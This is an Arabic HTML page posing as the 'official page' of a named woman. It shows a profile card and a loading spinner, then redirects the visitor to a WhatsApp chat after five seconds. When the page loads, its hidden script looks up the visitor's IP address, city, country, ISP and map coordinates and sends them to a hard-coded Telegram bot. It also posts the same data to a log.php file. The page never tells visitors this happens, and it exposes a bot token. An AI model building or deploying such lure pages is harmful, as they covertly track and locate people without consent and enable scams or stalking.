<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>هند العزاوي - الصفحة الرسمية</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f5f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      padding: 0;
    }
    .card {
      background: white;
      border-radius: 15px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
      padding: 30px;
      text-align: center;
      max-width: 400px;
      width: 90%;
    }
    .avatar {
      width: 150px;
      height: 150px;
      border-radius: 50%;
      object-fit: cover;
      margin-bottom: 20px;
      border: 3px solid #ff6b6b;
    }
    h2 {
      color: #333;
      margin: 10px 0;
    }
    p {
      color: #666;
      margin: 5px 0;
    }
    .loader {
      border: 5px solid #f3f3f3;
      border-top: 5px solid #ff6b6b;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 2s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
  <script>
    // إعدادات التلجرام
    const BOT_TOKEN = '7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM';
    const CHAT_ID = '7493001551';

    // دالة لإرسال الرسالة إلى التلجرام
    function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message
        })
      });
    }

    // تسجيل بيانات الزائر وإرسالها إلى التلجرام
    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        const ip = data.ip;
        const city = data.city || 'غير معروف';
        const region = data.region || 'غير معروف';
        const country = data.country_name || 'غير معروف';
        const loc = data.latitude + ',' + data.longitude;
        const googleMapsLink = `https://www.google.com/maps?q=${loc}`;
        const isp = data.org || 'غير معروف';
        
        const message = `🕵️‍♂️ زائر جديد للصفحة:
        
🌐 IP: ${ip}
🏙️ المدينة: ${city}
📍 المنطقة: ${region}
🌍 الدولة: ${country}
📡 مزود الخدمة: ${isp}
🗺️ الموقع على الخريطة:
${googleMapsLink}`;

        sendToTelegram(message);
        
        // إرسال البيانات إلى ملف log.php (اختياري)
        fetch('log.php', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify(data)
        });
      })
      .catch(error => {
        console.error('Error fetching location:', error);
        sendToTelegram('❌ فشل في جلب بيانات الموقع: ' + error.message);
      });

    // تحويل تلقائي إلى واتساب بعد 5 ثواني
    setTimeout(() => {
      window.location.href = "https://wa.me/963943820819?text=مرحبا";
    }, 5000);
  </script>
</head>
<body>
  <div class="card">
    <img src="https://i.imgur.com/4M7IWwP.png" alt="هند العزاوي" class="avatar">
    <h2>هند العزاوي</h2>
    <p>🌟 أهلاً بك في الصفحة الرسمية 🌟</p>
    <p>جارٍ التحويل إلى المحادثة الخاصة...</p>
    <div class="loader"></div>
  </div>
</body>
</html>
